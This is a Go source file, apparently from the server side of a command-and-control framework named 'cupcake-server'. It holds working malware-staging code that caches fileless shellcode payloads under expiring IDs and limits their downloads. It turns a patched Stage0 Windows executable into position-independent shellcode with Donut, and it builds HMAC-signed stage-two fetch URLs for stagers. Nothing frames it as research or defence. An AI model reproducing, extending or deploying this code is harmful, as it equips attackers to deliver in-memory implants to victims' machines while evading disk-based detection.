package services

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"cupcake-server/pkg/stagerguard"
)

// Stage2CacheEntry holds fileless PIC/shellcode for a short TTL.
type Stage2CacheEntry struct {
	Bytes     []byte
	Arch      string
	Listener  string
	C2URL     string
	Created   time.Time
	ExpiresAt time.Time
}

const stage2TTL = 10 * time.Minute

var (
	stage2Mu    sync.RWMutex
	stage2Cache = map[string]Stage2CacheEntry{}
	// stage2Hits limits downloads per stage2 id (same env as stager: CUPCAKE_STAGER_MAX_HITS).
	stage2Hits = stagerguard.NewHitCounter(stagerguard.MaxHitsFromEnv())
)

func init() {
	go func() {
		t := time.NewTicker(2 * time.Minute)
		defer t.Stop()
		for range t.C {
			now := time.Now()
			stage2Mu.Lock()
			for k, v := range stage2Cache {
				if now.After(v.ExpiresAt) {
					delete(stage2Cache, k)
					stage2Hits.Delete(k)
				}
			}
			stage2Mu.Unlock()
		}
	}()
}

// StoreStage2 caches stage2 bytes under id.
func StoreStage2(id string, body []byte, arch, listenerID, c2url string) {
	if id == "" || len(body) == 0 {
		return
	}
	stage2Mu.Lock()
	defer stage2Mu.Unlock()
	stage2Hits.Reset(id)
	stage2Cache[id] = Stage2CacheEntry{
		Bytes:     append([]byte(nil), body...),
		Arch:      arch,
		Listener:  listenerID,
		C2URL:     c2url,
		Created:   time.Now(),
		ExpiresAt: time.Now().Add(stage2TTL),
	}
}

// LoadStage2 returns cached stage2 payload without consuming a download hit (peek).
func LoadStage2(id string) ([]byte, Stage2CacheEntry, error) {
	stage2Mu.RLock()
	defer stage2Mu.RUnlock()
	e, ok := stage2Cache[id]
	if !ok {
		return nil, Stage2CacheEntry{}, fmt.Errorf("stage2 id not found or expired")
	}
	if time.Now().After(e.ExpiresAt) {
		return nil, Stage2CacheEntry{}, fmt.Errorf("stage2 id expired")
	}
	return append([]byte(nil), e.Bytes...), e, nil
}

// Stage2Exists reports whether id is present and not TTL-expired (no hit consumed).
func Stage2Exists(id string) bool {
	stage2Mu.RLock()
	defer stage2Mu.RUnlock()
	e, ok := stage2Cache[id]
	return ok && time.Now().Before(e.ExpiresAt)
}

// ConsumeStage2 returns cached stage2 payload after recording one download hit.
// status is suitable for audit (ok / 404 / expired / max_hits).
func ConsumeStage2(id string) (body []byte, meta Stage2CacheEntry, status string, err error) {
	stage2Mu.Lock()
	defer stage2Mu.Unlock()
	e, ok := stage2Cache[id]
	if !ok {
		return nil, Stage2CacheEntry{}, stagerguard.StatusNotFound, fmt.Errorf("stage2 id not found or expired")
	}
	if time.Now().After(e.ExpiresAt) {
		delete(stage2Cache, id)
		stage2Hits.Delete(id)
		return nil, Stage2CacheEntry{}, stagerguard.StatusExpired, fmt.Errorf("stage2 id expired")
	}
	if !stage2Hits.Try(id) {
		delete(stage2Cache, id)
		stage2Hits.Delete(id)
		return nil, Stage2CacheEntry{}, stagerguard.StatusMaxHits, fmt.Errorf("stage2 id download limit exceeded")
	}
	return append([]byte(nil), e.Bytes...), e, stagerguard.StatusOK, nil
}

// BuildFilelessStage2 patches PE already prepared by caller and converts to PIC via Donut.
// pe must be a patched Stage0 executable (same as disk delivery).
func BuildFilelessStage2(patchedPE []byte, arch string) ([]byte, error) {
	if len(patchedPE) < 64 {
		return nil, fmt.Errorf("patched PE too small")
	}
	if patchedPE[0] != 'M' || patchedPE[1] != 'Z' {
		return nil, fmt.Errorf("patched PE missing MZ")
	}
	arch = strings.ToLower(strings.TrimSpace(arch))
	sc, err := ToShellcodeFromBytes(patchedPE, arch)
	if err != nil {
		return nil, err
	}
	if len(sc) == 0 {
		return nil, fmt.Errorf("donut produced empty shellcode")
	}
	return sc, nil
}

// Stage2URL builds public stage2 fetch path for stager (includes HMAC token).
func Stage2URL(httpProto, downloadHost, id string) string {
	tok := stagerguard.SignStagerID(id)
	return fmt.Sprintf("%s://%s/api/stage2/%s?t=%s", httpProto, downloadHost, id, tok)
}

// ResolveStagerStage2URL returns CUPCAKE_STAGE2_URL-compatible absolute URL from id.
func ResolveStagerStage2URL(panelBase, stage2ID string) string {
	panelBase = strings.TrimRight(panelBase, "/")
	if panelBase == "" || stage2ID == "" {
		return ""
	}
	tok := stagerguard.SignStagerID(stage2ID)
	if strings.HasPrefix(panelBase, "http://") || strings.HasPrefix(panelBase, "https://") {
		return panelBase + "/api/stage2/" + stage2ID + "?t=" + tok
	}
	return "http://" + panelBase + "/api/stage2/" + stage2ID + "?t=" + tok
}
